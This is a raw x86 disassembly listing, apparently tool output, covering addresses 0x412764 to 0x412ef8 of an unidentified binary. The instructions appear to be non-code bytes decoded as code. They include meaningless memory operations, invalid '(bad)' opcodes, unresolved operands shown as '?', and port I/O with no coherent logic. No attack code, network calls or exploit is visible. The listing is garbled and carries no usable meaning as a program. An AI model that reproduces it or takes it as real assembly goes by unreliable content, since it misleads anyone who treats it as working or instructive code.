  412764:	or     BYTE PTR [ecx],ch
  412766:	add    BYTE PTR [ecx+0xe],al
  412769:	xchg   edx,eax
  41276a:	or     BYTE PTR [ecx],cl
  41276c:	add    cl,BYTE PTR [esi]
  41276e:	add    BYTE PTR [edx],al
  412770:	dec    ebx
  412771:	fsub   QWORD PTR [edx]
  412773:	and    al,BYTE PTR [eax+0x28]
  412776:	inc    esp
  412777:	adc    BYTE PTR [edx],0x80
  41277a:	add    BYTE PTR [edx-0x6b8bea01],al
  412780:	inc    edx
  412781:	add    BYTE PTR [ecx],dh
  412783:	test   BYTE PTR [ebx],cl
  412785:	add    BYTE PTR ds:0x4180100c,dl
  41278b:	and    dh,BYTE PTR [esi]
  41278d:	add    DWORD PTR [edx+0x40],eax
  412790:	pusha  
  412791:	add    BYTE PTR [eax+0x8],ah
  412794:	push   0x50
  412796:	and    BYTE PTR [eax],ah
  412798:	add    BYTE PTR [ecx],bh
  41279a:	push   edx
  41279b:	add    BYTE PTR [eax],cl
  41279d:	add    al,0x0
  41279f:	inc    eax
  4127a0:	inc    eax
  4127a1:	sbb    dl,BYTE PTR [ecx]
  4127a3:	bound  edx,QWORD PTR [edx]
  4127a5:	push   es
  4127a6:	add    BYTE PTR [eax],dl
  4127a8:	dec    edx
  4127a9:	sbb    BYTE PTR [eax+0x18],al
  4127ac:	cmp    BYTE PTR [eax-0x3f7defdf],dl
  4127b2:	les    eax,FWORD PTR [edx]
  4127b4:	sub    BYTE PTR [ebx],al
  4127b6:	cmp    BYTE PTR [eax],al
  4127b8:	adc    BYTE PTR [eax+eax*1+0x1088cc0],al
  4127bf:	nop
  4127c0:	push   eax
  4127c1:	inc    eax
  4127c2:	sbb    al,0x10
  4127c4:	adc    al,0x9
  4127c6:	push   ecx
  4127c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127c8:	add    cl,BYTE PTR [edx+0x208e0083]
  4127ce:	and    DWORD PTR ds:0x8cbb8b18,0x11062a20
  4127d8:	ror    BYTE PTR [eax],1
  4127da:	mov    DWORD PTR [ecx],esp
  4127dc:	add    BYTE PTR [eax],al
  4127de:	mov    al,ds:0x11000
  4127e3:	or     BYTE PTR [esi-0x36],ah
  4127e6:	add    BYTE PTR [edx],cl
  4127e8:	inc    esp
  4127e9:	push   es
  4127ea:	or     DWORD PTR [edx-0x4d],ecx
  4127ed:	add    BYTE PTR [eax],al
  4127ef:	add    al,BYTE PTR [eax]
  4127f1:	rcr    BYTE PTR [eax],0x0
  4127f4:	rol    BYTE PTR [eax],0xa0
  4127f7:	add    BYTE PTR [eax],al
  4127f9:	or     al,cl
  4127fb:	add    dl,BYTE PTR [eax+eax*8]
  4127fe:	add    DWORD PTR [eax+eax*1],edx
  412801:	adc    BYTE PTR [esi-0x6a],cl
  412804:	test   BYTE PTR [eax-0x7b],dl
  412807:	inc    edx
  412808:	or     al,0xd8
  41280a:	add    BYTE PTR [ebx-0x76],al
  41280d:	add    BYTE PTR [ebx-0x7ffd7ef6],ah
  412813:	sub    BYTE PTR [edx],ch
  412815:	add    al,0x1
  412817:	imul   edx,DWORD PTR [eax+eax*4],0xc069d82
  41281e:	or     al,0xe0
  412820:	inc    ecx
  412821:	adc    ch,BYTE PTR ds:0x400a0248
  412827:	adc    cl,BYTE PTR [edx]
  412829:	inc    esi
  41282a:	cmp    BYTE PTR [edx+0x20],0x18
  41282e:	push   ss
  41282f:	add    al,0x22
  412831:	add    DWORD PTR [esp+ebp*1+0x18022028],0x80089010
  41283c:	add    DWORD PTR [ecx+edx*2],eax
  41283f:	inc    eax
  412840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412841:	nop
  412842:	and    al,0x0
  412844:	inc    eax
  412845:	les    edx,FWORD PTR [edx+0x8802841]
  41284b:	imul   edx,DWORD PTR [eax],0x10
  41284e:	add    BYTE PTR [eax],0x0
  412851:	and    BYTE PTR [edx+0x0],cl
  412854:	add    ecx,DWORD PTR [ecx]
  412856:	add    BYTE PTR [eax],dl
  412858:	inc    eax
  412859:	xor    al,0x20
  41285b:	inc    eax
  41285c:	adc    al,0x4a
  41285e:	mov    al,ds:0x222226
  412863:	push   0xffffffc0
  412865:	test   al,0x1a
  412867:	and    BYTE PTR [edx],al
  412869:	and    DWORD PTR [ebx+eax*1+0x78],0x40
  41286e:	and    BYTE PTR [ecx],al
  412870:	sub    BYTE PTR [eax+0x18],al
  412873:	add    BYTE PTR [eax],dl
  412875:	inc    ecx
  412876:	cdq    
  412877:	xchg   esp,eax
  412878:	sub    al,BYTE PTR [eax+0x70b54e1]
  41287e:	adc    BYTE PTR [ebp+0x10038489],cl
  412884:	lods   al,BYTE PTR ds:[esi]
  412885:	and    BYTE PTR [esi],0x84
  412888:	test   DWORD PTR [eax],ebx
  41288a:	xor    BYTE PTR [eax],al
  41288c:	cwde   
  41288d:	push   ecx
  41288e:	add    cl,al
  412890:	test   BYTE PTR [esi],dl
  412892:	shl    al,1
  412894:	in     al,0x1
  412896:	cwde   
  412897:	inc    ecx
  412898:	test   al,0x20
  41289a:	popa   
  41289b:	and    cl,BYTE PTR [ebx]
  41289d:	adc    BYTE PTR [edx+0x0],0x20
  4128a1:	mov    eax,ds:0x2c7492
  4128a6:	mov    al,ds:0x3100900f
  4128ab:	or     edx,DWORD PTR [eax+ecx*1]
  4128ae:	test   eax,0x80e00400
  4128b3:	mov    ah,0x6
  4128b5:	add    BYTE PTR [ecx],al
  4128b7:	push   es
  4128b8:	out    0x20,eax
  4128ba:	add    eax,0x50c00450
  4128bf:	pop    es
  4128c0:	add    ecx,DWORD PTR [eax]
  4128c2:	adc    al,0x60
  4128c4:	or     BYTE PTR [eax+eax*1],bl
  4128c7:	xor    DWORD PTR [ecx+0x1020d08],ebx
  4128cd:	lea    eax,[eax]
  4128cf:	and    DWORD PTR [eax+eax*1],esp
  4128d2:	and    DWORD PTR [esi],0x45048000
  4128d8:	imul   ebp,DWORD PTR [eax-0x80],0x3a2c8854
  4128df:	add    BYTE PTR [eax],bl
  4128e1:	add    BYTE PTR [ecx+0x9],cl
  4128e4:	cmp    DWORD PTR [eax+0x8],eax
  4128e7:	mov    al,ds:0x64100014
  4128ec:	adc    BYTE PTR [edx],cl
  4128ee:	or     al,0x1
  4128f0:	or     BYTE PTR [edx+0x1],0x20
  4128f4:	inc    eax
  4128f5:	sbb    BYTE PTR [eax],dl
  4128f7:	and    DWORD PTR ds:0x8010dab2,eax
  4128fd:	jae    0x412931
  4128ff:	or     BYTE PTR [eax],dl
  412901:	xor    al,BYTE PTR [eax+0x2005e128]
  412907:	adc    BYTE PTR [edx],0xac
  41290a:	jl     0x4128a5
  41290c:	inc    esp
  41290d:	nop
  41290e:	adc    DWORD PTR [eax-0x49],0x74
  412912:	add    BYTE PTR [eax],al
  412914:	popa   
  412915:	adc    BYTE PTR [edi+0x13331000],cl
  41291b:	popa   
  41291c:	or     dl,dl
  41291e:	and    DWORD PTR [edx+0x10],eax
  412921:	inc    eax
  412922:	mov    al,ds:0xca2338cc
  412927:	adc    BYTE PTR [eax+0x8],ah
  41292a:	and    al,0x25
  41292c:	adc    BYTE PTR [eax],ah
  41292e:	and    eax,0xe200020
  412933:	inc    esi
  412934:	mov    WORD PTR [eax],?
  412936:	xor    BYTE PTR [eax+0x20],al
  412939:	add    dh,BYTE PTR [edx]
  41293b:	or     al,0x8
  41293e:	fwait
  41293f:	and    BYTE PTR [eax+0x140ec381],al
  412945:	add    BYTE PTR [eax],al
  412947:	add    al,0xd4
  412949:	and    dl,al
  41294b:	adc    BYTE PTR [eax],bl
  41294d:	push   ecx
  41294e:	retf   0xb16a
  412951:	shl    BYTE PTR [ecx-0x7f775898],0x0
  412958:	add    BYTE PTR [ebx+0x10],ah
  41295b:	push   eax
  41295c:	mov    al,ds:0x8000004
  412961:	xor    BYTE PTR [eax],al
  412963:	and    BYTE PTR [edx],ah
  412965:	mov    al,BYTE PTR [eax+0x12700800]
  41296b:	push   edx
  41296c:	and    BYTE PTR [eax],al
  41296e:	push   ss
  41296f:	dec    eax
  412970:	add    BYTE PTR [eax],al
  412972:	add    DWORD PTR [ecx],ecx
  412974:	jo     0x41299a
  412976:	adc    eax,0x104c4058
  41297b:	sub    eax,0xc00040a0
  412980:	adc    al,BYTE PTR [esi-0x7f]
  412983:	push   edx
  412984:	gs add al,0x15
  412987:	sub    DWORD PTR [edx+0x43],0x214083a1
  41298e:	sbb    BYTE PTR [esi+0x4f02e1],al
  412994:	and    BYTE PTR ds:0x8818290,al
  41299a:	add    BYTE PTR [eax],ch
  41299c:	test   BYTE PTR [edx+0x3c],ah
  41299f:	sub    BYTE PTR [edx],al
  4129a1:	and    BYTE PTR [esi],cl
  4129a3:	add    BYTE PTR [eax],al
  4129a5:	sbb    BYTE PTR [ecx],bl
  4129a7:	or     BYTE PTR [eax+eax*1],al
  4129aa:	loopne 0x4129d8
  4129ac:	or     BYTE PTR [ecx+ebx*2+0x8],al
  4129b0:	sub    BYTE PTR [eax],al
  4129b2:	add    DWORD PTR [eax],edx
  4129b4:	add    DWORD PTR [eax],eax
  4129b6:	add    DWORD PTR [eax],edx
  4129b8:	jo     0x41293d
  4129ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129bb:	sbb    BYTE PTR [eax+0x1306160],dl
  4129c1:	or     esp,DWORD PTR [eax]
  4129c3:	mov    ah,0x50
  4129c5:	dec    edx
  4129c6:	add    BYTE PTR [eax],0x47
  4129c9:	add    BYTE PTR [ebx+eax*2+0x52],dl
  4129cd:	and    DWORD PTR [edx],eax
  4129cf:	or     BYTE PTR [eax],dl
  4129d1:	and    BYTE PTR [esp+ebp*4+0x68],al
  4129d5:	add    cl,BYTE PTR [eax-0x7e]
  4129d8:	adc    BYTE PTR [ebx],0x48
  4129db:	mov    al,ds:0xb008080
  4129e0:	adc    esi,DWORD PTR [ecx]
  4129e2:	popa   
  4129e3:	add    DWORD PTR [ecx],esp
  4129e5:	xchg   ecx,eax
  4129e6:	add    BYTE PTR [eax+eax*2],ah
  4129e9:	or     al,0x10
  4129eb:	sub    al,al
  4129ed:	mov    al,0x6
  4129ef:	or     BYTE PTR [edx+eax*1+0x10a01840],ah
  4129f6:	dec    eax
  4129f7:	push   es
  4129f8:	and    al,0xca
  4129fa:	mov    al,ds:0x1201008
  4129ff:	sub    DWORD PTR [edx],ebx
  412a01:	les    esp,FWORD PTR [eax-0x58]
  412a04:	inc    edi
  412a05:	and    BYTE PTR [eax+0x21000023],0x24
  412a0c:	inc    ebp
  412a0d:	and    bh,BYTE PTR [ecx+0x330480d8]
  412a13:	and    BYTE PTR [eax+eax*1-0x39],dl
  412a17:	xor    cl,0x20
  412a1a:	push   cs
  412a1b:	adc    BYTE PTR [edi+0x24],al
  412a1e:	push   es
  412a1f:	or     al,0xc
  412a21:	sub    DWORD PTR [edx+ecx*1+0x20],eax
  412a25:	sub    BYTE PTR [eax],ah
  412a27:	push   es
  412a28:	dec    edx
  412a29:	mov    dl,0xa0
  412a2b:	add    BYTE PTR [eax],al
  412a2d:	fadd   st,st(1)
  412a2f:	dec    ebx
  412a30:	jb     0x4129b7
  412a32:	adc    BYTE PTR [eax],bl
  412a34:	adc    eax,0x24100040
  412a39:	push   eax
  412a3a:	mov    al,ds:0x88922001
  412a3f:	add    BYTE PTR [eax-0x78],al
  412a42:	add    BYTE PTR [ecx+eax*2+0x10212910],bh
  412a49:	mov    BYTE PTR [edx+0x218041a],al
  412a4f:	test   eax,0xd3600
  412a54:	(bad)  
  412a55:	and    BYTE PTR [eax],bl
  412a57:	add    esp,DWORD PTR [eax-0x7e]
  412a5a:	inc    eax
  412a5b:	add    al,al
  412a5d:	and    BYTE PTR [esi],ah
  412a5f:	push   0xffffffc0
  412a61:	mov    cl,0x80
  412a63:	adc    BYTE PTR [eax],dl
  412a65:	sbb    eax,DWORD PTR [eax+0x8084d44]
  412a6b:	or     cl,BYTE PTR [eax]
  412a6d:	add    BYTE PTR [edx-0x7f6f7bfd],al
  412a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a74:	nop
  412a75:	pop    edx
  412a76:	rcl    DWORD PTR [ebx+ecx*1],0x7e
  412a7a:	adc    BYTE PTR [edx+edx*1],al
  412a7d:	add    al,0x40
  412a7f:	push   es
  412a80:	or     BYTE PTR [ebp+eiz*1+0x292836],dl
  412a87:	adc    al,0x6
  412a89:	or     BYTE PTR [eax],al
  412a8b:	bound  ebx,QWORD PTR [eax]
  412a8d:	push   ebp
  412a8e:	adc    BYTE PTR [ecx],bl
  412a90:	sub    BYTE PTR [eax],dl
  412a92:	inc    eax
  412a93:	add    BYTE PTR [eax+0x77],al
  412a96:	adc    BYTE PTR [eax-0x20],0x0
  412a9a:	add    al,0xb5
  412a9c:	inc    eax
  412a9d:	ja     0x412a5f
  412a9f:	adc    al,0x0
  412aa1:	dec    eax
  412aa2:	rcr    esi,0xe0
  412aa5:	sub    al,0x0
  412aa7:	inc    ecx
  412aa8:	or     BYTE PTR [ecx+edx*8],al
  412aab:	add    al,0x13
  412aad:	add    al,al
  412aaf:	mov    al,ds:0x6300380b
  412ab4:	nop
  412ab5:	bound  edx,QWORD PTR ds:0x88009822
  412abb:	add    BYTE PTR [eax],al
  412abd:	push   eax
  412abe:	mov    cl,BYTE PTR [ecx+0x10]
  412ac1:	mov    BYTE PTR [esp+edx*4-0x77],al
  412ac5:	and    BYTE PTR [eax],dl
  412ac7:	or     al,BYTE PTR [edx+eax*1-0x37]
  412acb:	inc    ebp
  412acc:	repnz sbb al,BYTE PTR [eax]
  412acf:	and    BYTE PTR [ebx+edx*4],al
  412ad2:	add    al,BYTE PTR [edi-0x3f57fbdf]
  412ad8:	add    BYTE PTR [esi+eax*1+0x1208429],dl
  412adf:	loope  0x412af3
  412ae1:	adc    ah,al
  412ae3:	sbb    eax,0x18177d0c
  412ae8:	add    BYTE PTR [esp+edx*1],al
  412aeb:	inc    esp
  412aec:	push   eax
  412aed:	add    eax,0x18620820
  412af2:	dec    eax
  412af3:	or     BYTE PTR [eax],al
  412af5:	and    BYTE PTR [ebx+0x4204040],al
  412afb:	add    al,0x66
  412afd:	adc    eax,0x21001c76
  412b02:	add    BYTE PTR [eax],al
  412b04:	or     al,BYTE PTR [eax]
  412b06:	add    BYTE PTR [eax],bl
  412b08:	adc    BYTE PTR [eax],al
  412b0a:	add    al,0x30
  412b0c:	and    DWORD PTR [eax],eax
  412b0e:	sbb    BYTE PTR [ecx-0x3fffbf72],ah
  412b14:	add    BYTE PTR [ecx],cl
  412b16:	adc    eax,0x8866c215
  412b1b:	add    dh,al
  412b1d:	or     al,0x14
  412b1f:	mov    eax,ds:0x483484c5
  412b24:	mov    al,cl
  412b26:	and    BYTE PTR [ecx+0x5802],al
  412b2c:	adc    DWORD PTR [eax],eax
  412b2e:	in     al,0x1
  412b30:	inc    edx
  412b31:	xchg   esp,eax
  412b32:	add    BYTE PTR [eax],al
  412b34:	sbb    dh,BYTE PTR [eax]
  412b36:	and    ecx,DWORD PTR [edx+edx*4+0x1104a008]
  412b3d:	or     BYTE PTR [eax+eiz*2+0x63],cl
  412b41:	add    al,0x1
  412b43:	and    DWORD PTR [esp+eax*4-0x5ffffdf7],eax
  412b4a:	sbb    al,0xa1
  412b4c:	or     BYTE PTR [eax],al
  412b4e:	add    DWORD PTR [eax],0x40
  412b51:	nop
  412b52:	xor    al,0x40
  412b54:	add    BYTE PTR [eax+0x4],al
  412b57:	add    DWORD PTR [ecx],esi
  412b59:	add    BYTE PTR [eax+0x43],al
  412b5c:	and    dh,BYTE PTR [eax+0x24197181]
  412b62:	mov    BYTE PTR [edx],cl
  412b64:	add    BYTE PTR [edx+0x2006296a],al
  412b6a:	push   0x20481a20
  412b6f:	and    BYTE PTR [edx],0x52
  412b72:	inc    eax
  412b73:	sbb    ebp,DWORD PTR [edx]
  412b75:	add    eax,0xa500110c
  412b7a:	cwde   
  412b7b:	js     0x412b8f
  412b7d:	and    BYTE PTR [eax],0x0
  412b80:	test   BYTE PTR [edx],dl
  412b82:	add    BYTE PTR [eax],0x41
  412b85:	add    BYTE PTR [edx],al
  412b87:	or     BYTE PTR [esi+ecx*1],cl
  412b8a:	push   ebp
  412b8b:	mov    BYTE PTR [eax+0x9801],al
  412b91:	add    BYTE PTR [eax],al
  412b93:	mov    eax,ds:0x5001a118
  412b98:	or     BYTE PTR [eax],al
  412b9a:	fs xor eax,0x3074800c
  412ba0:	mov    gs,WORD PTR [eax]
  412ba2:	mov    BYTE PTR [eax],cl
  412ba4:	push   cs
  412ba5:	dec    esi
  412ba6:	pusha  
  412ba7:	sbb    cl,dl
  412ba9:	add    al,0x48
  412bac:	add    BYTE PTR [edx],dh
  412bae:	or     BYTE PTR [eax-0x3fd7ad98],0xe0
  412bb5:	or     BYTE PTR [eax-0x7b],al
  412bb8:	adc    BYTE PTR [eax],ah
  412bba:	adc    BYTE PTR [ecx+0x22],ah
  412bbd:	dec    eax
  412bbe:	add    BYTE PTR [eax],0x35
  412bc1:	push   eax
  412bc2:	sbb    BYTE PTR [ecx+0xa438069],ah
  412bc8:	mov    BYTE PTR [eax+0x13],dl
  412bcb:	pop    es
  412bcc:	or     DWORD PTR [ecx],ecx
  412bce:	add    DWORD PTR [esi-0x38ef7f70],ecx
  412bd4:	adc    BYTE PTR [eax-0x7e5ec800],0x0
  412bdb:	xor    DWORD PTR [ecx],eax
  412bdd:	sbb    al,BYTE PTR [ebx+0x48]
  412be0:	pushf  
  412be1:	push   es
  412be2:	sub    BYTE PTR [eax+0xc0b108c],ah
  412be8:	dec    ebp
  412be9:	add    DWORD PTR [eax],ecx
  412beb:	push   ebx
  412bec:	adc    BYTE PTR [eax],ah
  412bee:	sbb    BYTE PTR [edx+0x5240],bl
  412bf4:	or     eax,0xa809d002
  412bf9:	adc    DWORD PTR [eax+0x11],edx
  412bfc:	jmp    0x2634403
  412c01:	add    dl,al
  412c03:	je     0x412c15
  412c05:	adc    BYTE PTR [eax+eiz*4+0x43008920],0xe
  412c0d:	add    BYTE PTR [ebx],al
  412c0f:	add    BYTE PTR [eax],bl
  412c11:	and    eax,0x2189009c
  412c16:	add    DWORD PTR [edx-0x80],edi
  412c19:	and    ebx,DWORD PTR [ecx+0x2b359c63]
  412c1f:	pusha  
  412c20:	inc    eax
  412c21:	or     BYTE PTR [ebp+0x401e09b],dl
  412c27:	sub    BYTE PTR [esi],ah
  412c29:	adc    al,0xc0
  412c2b:	adc    BYTE PTR [edx],al
  412c2d:	add    BYTE PTR [ebx+0x71],al
  412c30:	xor    ecx,esp
  412c32:	add    BYTE PTR [edx+eax*1],cl
  412c35:	add    BYTE PTR [eax],dl
  412c37:	or     al,0x1c
  412c39:	add    al,0x40
  412c3b:	sbb    DWORD PTR [ecx],esp
  412c3d:	add    al,BYTE PTR [eax+0x10]
  412c40:	and    DWORD PTR [esi+0x48800091],0x802a68b
  412c4a:	and    BYTE PTR [edx+eax*1],dl
  412c4d:	dec    ecx
  412c4e:	adc    BYTE PTR [eax],ah
  412c50:	add    eax,0x90043188
  412c55:	pusha  
  412c56:	and    al,0x44
  412c58:	inc    eax
  412c59:	inc    eax
  412c5a:	add    BYTE PTR [eax],al
  412c5c:	xor    DWORD PTR [eax],ebp
  412c5e:	sub    BYTE PTR [edx],cl
  412c60:	or     BYTE PTR [eax],al
  412c62:	adc    al,0x40
  412c64:	xchg   BYTE PTR [eax+eax*1+0x2040c005],al
  412c6b:	and    al,dh
  412c6d:	add    eax,0x14808035
  412c72:	adc    DWORD PTR [eax+ecx*2],ecx
  412c75:	inc    eax
  412c76:	dec    esp
  412c77:	adc    BYTE PTR [edx],cl
  412c79:	xchg   DWORD PTR [ecx+0x8040100],eax
  412c7f:	sbb    al,0x2
  412c81:	adc    al,0x60
  412c83:	cmovb  eax,DWORD PTR [esi+0x36e4d9]
  412c8a:	or     BYTE PTR [edx],0x2
  412c8d:	in     eax,dx
  412c8e:	add    BYTE PTR [ecx+0x61],dl
  412c94:	xor    BYTE PTR [eax-0x5febfde4],0x10
  412c9b:	and    al,0x20
  412c9e:	or     al,0x50
  412ca0:	inc    eax
  412ca1:	adc    BYTE PTR [edx],0x39
  412ca4:	or     BYTE PTR [eax+0x2],al
  412ca7:	adc    BYTE PTR [esi*1+0x5600c84],al
  412cae:	push   ss
  412caf:	and    DWORD PTR [ecx+eax*1],eax
  412cb2:	adc    BYTE PTR cs:[edx],ah
  412cb5:	inc    esi
  412cb6:	dec    eax
  412cb7:	inc    eax
  412cb8:	and    BYTE PTR [ecx],al
  412cba:	xchg   esp,eax
  412cbb:	or     ah,ah
  412cbd:	inc    eax
  412cbe:	add    DWORD PTR [eax+0x40010900],edx
  412cc4:	mov    DWORD PTR [esi+0x11],edx
  412cc7:	adc    BYTE PTR [eax],al
  412cc9:	add    BYTE PTR [eax],al
  412ccb:	sbb    BYTE PTR [eax],dl
  412ccd:	or     BYTE PTR [eax+0x9561c],ah
  412cd3:	add    DWORD PTR [ecx+0x48940018],esp
  412cd9:	or     BYTE PTR [eax*2+0xc4880cb],al
  412ce0:	add    BYTE PTR [edx+0xa00a81],dl
  412ce6:	and    BYTE PTR [edx],0x90
  412ce9:	add    BYTE PTR [eax],al
  412ceb:	adc    BYTE PTR [ecx-0x377fb7fe],al
  412cf1:	mov    al,ds:0x60684921
  412cf6:	inc    ecx
  412cf7:	add    al,0x9
  412cf9:	inc    esp
  412cfa:	xchg   esp,eax
  412cfb:	dec    ecx
  412cfc:	add    al,0x41
  412cfe:	add    ah,BYTE PTR [eax]
  412d00:	adc    BYTE PTR [ecx+0x31000530],dl
  412d06:	push   es
  412d07:	sub    BYTE PTR [ebx+0x21],dl
  412d0a:	xor    al,dl
  412d0c:	and    al,0x80
  412d0e:	or     BYTE PTR [eax+0x12],0x0
  412d12:	add    DWORD PTR [edi-0x56],eax
  412d15:	add    BYTE PTR [ebx],cl
  412d17:	and    BYTE PTR [eax+ebp*4],ah
  412d1a:	or     BYTE PTR [ebp+0x50],0x1
  412d1e:	sbb    BYTE PTR [eax+eax*4+0x40],dl
  412d22:	ins    BYTE PTR es:[edi],dx
  412d23:	add    BYTE PTR [edi+edi*4+0x48],dl
  412d27:	and    BYTE PTR [ecx],ah
  412d29:	add    DWORD PTR [ebx],eax
  412d2b:	adc    eax,esp
  412d2d:	or     BYTE PTR [eax+eiz*1+0xd00001],al
  412d34:	sbb    BYTE PTR [eax+0x59],ah
  412d37:	add    DWORD PTR [eax-0x4b9bdeb7],esp
  412d3d:	jo     0x412d43
  412d3f:	add    ah,al
  412d41:	xor    BYTE PTR [eax],ah
  412d43:	or     al,0xa0
  412d45:	mov    al,ds:0x48400c04
  412d4a:	arpl   WORD PTR [ecx+0x9],cx
  412d50:	add    DWORD PTR [esi],ecx
  412d52:	adc    DWORD PTR [esi],0x4a008001
  412d58:	push   eax
  412d59:	sbb    BYTE PTR [eax],al
  412d5b:	adc    DWORD PTR [eax],eax
  412d5d:	inc    eax
  412d5e:	adc    DWORD PTR [eax],esp
  412d60:	push   es
  412d61:	add    BYTE PTR [eax],ah
  412d63:	sub    BYTE PTR [eax+0x418606a],al
  412d69:	mov    BYTE PTR [eax],al
  412d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d6c:	adc    eax,0xa1340642
  412d71:	sbb    DWORD PTR [edx],0x8509500
  412d77:	sub    BYTE PTR [eax],0x2
  412d7a:	inc    eax
  412d7b:	dec    eax
  412d7c:	dec    eax
  412d7d:	rol    BYTE PTR [ecx+0x1c],0x4c
  412d81:	cs add eax,0xe00c6
  412d87:	add    al,BYTE PTR [ebx-0x50]
  412d8a:	xor    BYTE PTR [ecx],ch
  412d8c:	loopne 0x412dd2
  412d8e:	push   es
  412d8f:	add    eax,0x80921402
  412d94:	inc    edx
  412d95:	and    BYTE PTR [edx-0x6e],dl
  412d98:	adc    DWORD PTR [ebx],edx
  412d9a:	adc    al,0x1
  412d9c:	or     BYTE PTR [ebx],0x22
  412d9f:	add    BYTE PTR [esp+edi*8+0x0],bl
  412da3:	sbb    BYTE PTR [ebp-0x80],0xb4
  412da7:	xor    DWORD PTR [edx-0x1076bd7e],eax
  412dad:	add    BYTE PTR [eax],al
  412daf:	les    ecx,FWORD PTR [ecx]
  412db1:	adc    BYTE PTR ds:0x8e073208,dl
  412db7:	and    al,0x2
  412db9:	add    DWORD PTR [eax-0x57],eax
  412dbc:	inc    edx
  412dbd:	or     BYTE PTR [eax],al
  412dbf:	and    BYTE PTR [eax],al
  412dc1:	inc    eax
  412dc2:	xor    dl,0xa
  412dc5:	inc    ebx
  412dc6:	or     BYTE PTR [eax+0x10],ah
  412dc9:	add    BYTE PTR [eax+0x10],al
  412dcc:	and    al,BYTE PTR [eax]
  412dce:	mov    BYTE PTR [ebp-0x6e77fff7],ch
  412dd4:	or     DWORD PTR [edi],esp
  412dd6:	inc    esp
  412dd7:	sbb    al,0x81
  412dd9:	push   edx
  412dda:	sub    BYTE PTR [esi-0x68],cl
  412ddd:	les    eax,FWORD PTR [eax+0x700d204]
  412de3:	dec    eax
  412de4:	xchg   ebp,eax
  412de5:	add    ah,BYTE PTR [eax]
  412de7:	add    BYTE PTR [eax],al
  412de9:	dec    eax
  412dea:	push   eax
  412deb:	push   esi
  412dec:	add    BYTE PTR [edi],dl
  412dee:	and    BYTE PTR [eax],al
  412df0:	add    al,0x0
  412df2:	lods   al,BYTE PTR ds:[esi]
  412df3:	inc    esp
  412df4:	add    DWORD PTR [eax],ecx
  412df6:	push   edx
  412df7:	adc    al,0x64
  412df9:	and    BYTE PTR [eax],ah
  412dfb:	rcl    BYTE PTR [eax-0x1f5dffb6],0xa4
  412e02:	add    DWORD PTR [eax],eax
  412e04:	sub    BYTE PTR [ecx+0x20],cl
  412e07:	xor    BYTE PTR es:[ecx],0x0
  412e0b:	or     BYTE PTR [ebp+0x20],ah
  412e0e:	add    al,0x58
  412e10:	mov    DWORD PTR [eax-0x30],ebp
  412e13:	xchg   ebp,eax
  412e14:	push   eax
  412e15:	inc    ebx
  412e16:	and    BYTE PTR [edi],0x20
  412e19:	and    ah,BYTE PTR [eax+0x46]
  412e1c:	add    BYTE PTR [eax],bl
  412e1e:	add    al,0x79
  412e20:	xor    DWORD PTR [edx+0x6],ebx
  412e23:	and    BYTE PTR [edx],0xc4
  412e26:	adc    BYTE PTR [ebp+0x11],ah
  412e29:	loope  0x412dab
  412e2b:	and    ah,BYTE PTR [eax]
  412e2d:	or     BYTE PTR [eax+0x28e00240],0x0
  412e34:	add    al,0x9
  412e36:	add    BYTE PTR [ecx+0x22472867],0x4
  412e3d:	inc    eax
  412e3e:	and    BYTE PTR [eax+0x44],dl
  412e41:	dec    eax
  412e42:	add    BYTE PTR [eax],al
  412e44:	add    BYTE PTR [edx+0x20],bl
  412e47:	inc    esp
  412e48:	adc    BYTE PTR [eax+0x18],cl
  412e4b:	or     eax,DWORD PTR [ecx]
  412e4d:	or     DWORD PTR [eax+0xc],ecx
  412e50:	add    al,0x0
  412e52:	push   cs
  412e53:	xchg   DWORD PTR [edx],ebx
  412e55:	or     eax,DWORD PTR [eax+esi*1]
  412e58:	dec    eax
  412e59:	add    BYTE PTR [ecx],bl
  412e5b:	add    eax,DWORD PTR [eax-0x5ff55fa7]
  412e61:	adc    BYTE PTR [ecx+eax*1],dh
  412e64:	and    al,BYTE PTR [eax-0x6e]
  412e67:	jb     0x412e93
  412e69:	xchg   ebx,eax
  412e6a:	inc    ecx
  412e6b:	test   BYTE PTR [eax],al
  412e6d:	adc    BYTE PTR [edx],al
  412e6f:	adc    dl,BYTE PTR [eax+0x0]
  412e72:	push   0x8092400
  412e77:	pop    ebp
  412e78:	and    BYTE PTR [edx],al
  412e7a:	and    al,0xc0
  412e7c:	sub    BYTE PTR [ecx-0x37e1fa2c],cl
  412e82:	mov    al,ds:0x606260f
  412e87:	or     ebp,ecx
  412e89:	inc    eax
  412e8a:	nop
  412e8b:	dec    esp
  412e8c:	adc    DWORD PTR [eax+0x1442601],edx
  412e92:	adc    BYTE PTR [ebx],al
  412e94:	pusha  
  412e95:	and    BYTE PTR [eax],ah
  412e97:	inc    ebx
  412e98:	inc    eax
  412e99:	and    DWORD PTR [eax],0x93024a23
  412e9f:	add    BYTE PTR [ecx],ch
  412ea1:	inc    edi
  412ea2:	add    al,al
  412ea4:	pop    eax
  412ea5:	adc    DWORD PTR [esi+ebp*1],ecx
  412ea8:	add    al,0xc
  412eaa:	adc    BYTE PTR [edx+eiz*1],0x1
  412eae:	add    al,0x88
  412eb0:	and    BYTE PTR [eax+0x12],0x6
  412eb4:	add    al,0x0
  412eb6:	push   eax
  412eb7:	push   eax
  412eb8:	push   esi
  412eb9:	add    DWORD PTR [ebx],eax
  412ebb:	adc    BYTE PTR [eax+0x4],0x0
  412ebf:	sbb    al,BYTE PTR [eax+0x18608482]
  412ec5:	add    BYTE PTR [eax*1+0xc021000],dh
  412ecc:	add    BYTE PTR [ecx],ah
  412ece:	add    BYTE PTR [edx],al
  412ed0:	pusha  
  412ed1:	adc    al,BYTE PTR [esi]
  412ed3:	xor    al,0xc5
  412ed5:	add    dh,cl
  412ed7:	add    DWORD PTR [eax],esp
  412ed9:	sub    DWORD PTR [ecx],ecx
  412edb:	add    al,0x10
  412edd:	mov    WORD PTR [ecx+0x6018a0f0],?
  412ee3:	push   edi
  412ee4:	or     al,0xbc
  412ee6:	add    BYTE PTR [eax],0x1
  412ee9:	add    BYTE PTR [ecx+0x881181a],al
  412eef:	add    DWORD PTR [eax+0x6],ebx
  412ef2:	sbb    ebp,DWORD PTR [edx]
  412ef4:	nop
  412ef5:	add    BYTE PTR [eax],al
  412ef7:	nop
  412ef8:	and    BYTE PTR [edx-0x58],al
